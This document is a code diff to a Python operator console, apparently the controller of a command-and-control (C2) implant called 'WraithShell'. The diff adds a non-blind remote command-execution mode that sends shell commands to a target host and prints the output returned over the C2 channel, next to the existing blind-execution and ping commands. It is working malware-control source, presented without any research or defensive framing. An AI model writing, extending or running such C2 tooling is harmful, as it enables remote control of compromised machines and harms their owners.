@@ -8,7 +8,7 @@ import cmd
 
 MAGIC_BYTES = 0x0b1e55ed
 C2_PORT = 6969
-CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02}
+CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02, "CMD_EXEC" : 0x03}
 
 PURPLE = "\033[95m"
 RESET  = "\033[0m"
@@ -102,6 +102,17 @@ class WraithShell(cmd.Cmd):
                 message = output.decode(errors="replace").strip().lower()
                 if message == "pong":
                     print(f"[+] Pong received from {addr[0]}")
+                else:
+                    # Clear current input line
+                    sys.stdout.write('\r\033[K') 
+
+                    print(f"\n[+] Incoming response from {addr[0]}")
+                    print(message)
+
+                    #sys.stdout.write(self.prompt)
+
+                    # Flush stdout
+                    sys.stdout.flush()
 
         # Thread the accept loop
         t = threading.Thread(target=_accept_loop, daemon=True)
@@ -157,23 +168,37 @@ class WraithShell(cmd.Cmd):
 
     # Handle exec
     def do_exec(self, arg):
-        """exec blind [cmd]"""
+        """exec [cmd]\nexec blind [cmd]"""
 
-        if not self._check_target():
-            return
+        args = arg.split()
 
-        cmd_blind_split = arg.split("blind", 1)
+        if len(args) < 1:
+            print(self.do_exec.__doc__)
 
-        if len(cmd_blind_split) == 2:
 
-            cmd = cmd_blind_split[1].strip()
+        elif args[0] == "blind":
+
+            cmd = arg.split("blind", 1)[1].strip()
 
             print(f"Executing command '{cmd}' BLIND")
 
             self.sender_wrapper(cmd, "CMD_EXEC_BLIND", self.target_IP, self.target_port)
 
         else:
-            print(self.do_exec.__doc__)
+
+            if not self._check_target():
+                return
+
+            cmd_args = arg.split("exec", 1)
+
+            cmd = cmd_args[0].strip()
+
+            print(f"Executing command '{cmd}'")
+
+            self.sender_wrapper(cmd, "CMD_EXEC", self.target_IP, self.target_port)
+
+        #else:
+        #    print(self.do_exec.__doc__)
 
     # Handle listener
     def do_listener(self, arg):
